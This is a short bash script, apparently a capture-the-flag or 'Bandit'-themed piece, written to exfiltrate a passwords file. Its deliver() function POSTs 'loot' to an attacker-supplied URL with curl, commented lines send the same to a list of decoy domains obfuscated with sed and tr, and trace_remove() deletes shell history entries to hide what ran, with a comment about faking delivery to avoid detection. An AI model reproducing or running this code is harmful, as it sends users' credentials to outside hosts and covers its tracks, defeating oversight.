trace_remove(){
	#hurry up hurrry stop
    history -d $(history  | tail -1 |  awk '{print $1}');
    history -w ;
};


# deliver ;
deliver(){
	echo -n "$1" $db;
	curl -X POST -d "loot=$db" $1;
};

passwords_domain="https://release.zip";
source_of_gt="https://www.youtube.com/watch?v=xvFZjo5PgG0";
link="drive.google.com/BANDIT/sxdslkdjflasldf";
takeaway="loot_storage.cold.com";
some="wired.ctf.eng.run";
anywhere="pass.in";
door="all.onion";
anything="sudo_receive.in.";
got_ya="bi0s.in";
web_interface="passwords_collection.com";
storage="rockyou.com";
export db="~/passwords.txt";
bb="passwords_collection.com";
su_1_dollar="b4ndt.com";
number_one="secure_storage_over_ssl.org";
_1_dollar="santa_collection.dad";
__1dollar="passed.mov";
st="oot.com";
encrypt="yay.com";
finish="xnx.com";
eat="mnm.com";
sasdf="x.com";

update_links(){
    #dynamically building the links, for seeders to receive;

    finish=$(echo $finish | sed 's/xnx/xxx/g');
    encrypt=$(echo $encrypt | sed 's/yay/yeet/g');
    eat=$(echo $eat | sed 's/mnm/mnmn/g');
    st=$(echo $st | sed 's/oot/loot/g');
    __1dollar=$(echo $__1dollar | sed 's/passed/loot/g');



 
    _1_dollar=$(echo $_1_dollar | tr '[:lower:]' '[:upper:]');
    su_1_dollar=$(echo $su_1_dollar | tr '[:lower:]' '[:upper:]');
    number_one=$(echo $number_one | tr '[:lower:]' '[:upper:]');
    got_ya=$(echo $got_ya | tr '[:lower:]' '[:upper:]');
    anything=$(echo $anything | tr '[:lower:]' '[:upper:]');
  
    anywhere=$(echo $anywhere | awk -F "." '{print $1}');
    door=$(echo $door | awk -F "." '{print $1}');
    takeaway=$(echo $takeaway | awk -F "." '{print $1}');
    some=$(echo $some | awk -F "." '{print $1}');

   
    # curl -X POST -d "loot=$db" $passwords_domain > /dev/null 2>&1;
    # curl -X POST -d "loot=$db" $source_of_gt > /dev/null 2>&1;
    # curl -X POST -d "loot=$db" $link > /dev/null 2>&1;
    
    # #fake deliever to local host using deliver() to avoid detection and suppress errors;
    # deliver "http://localhost:8080" > /dev/null 2>&1;
};



crypto=$(head -c 32 /dev/urandom | xxd -p -c 32); # random number generator;
update_links $crypto;

shuru(){
    update_links $crypto;
	deliver $1;
};
shuru $1;

echo "Done Securing Package!, Bandit is clearing tracks\n";
trace_remove;
eval "clear";

